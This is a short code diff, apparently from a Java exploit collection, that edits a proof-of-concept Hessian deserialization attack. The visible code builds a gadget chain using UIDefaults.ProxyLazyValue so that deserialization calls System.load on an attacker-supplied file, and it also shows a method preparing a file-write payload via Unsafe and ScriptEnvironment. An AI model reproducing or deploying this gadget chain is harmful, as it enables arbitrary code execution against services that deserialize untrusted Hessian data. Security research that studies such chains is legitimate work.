@@ -18,8 +18,10 @@ public class MimeTypeParameterList_ProxyLazyValue_Sysload {
 
         Object o = sysLoadPayload();
         byte[] bytes1 = HessianTools.hessian2ToStringSer(o);
-        HessianTools.hessian2Deser(bytes1);
+        HessianTools.hessianDeser(bytes1, "2");
     }
+
+
 
     public static Object writeFilePayload() throws Exception {
         Object scriptenv = UnsafeTools.getObjectByUnsafe(ScriptEnvironment.class);
@@ -43,7 +45,7 @@ public class MimeTypeParameterList_ProxyLazyValue_Sysload {
 
     public static Object sysLoadPayload() throws Exception {
 
-        UIDefaults.ProxyLazyValue proxyLazyValue = new UIDefaults.ProxyLazyValue("java.lang.System", "load", new Object[]{"D:/test.class"});
+        UIDefaults.ProxyLazyValue proxyLazyValue = new UIDefaults.ProxyLazyValue("java.lang.System", "load", new Object[]{"D:/test"});
         ReflectTools.setFieldValue(proxyLazyValue, "acc", null);
 
         UIDefaults uiDefaults = new UIDefaults();
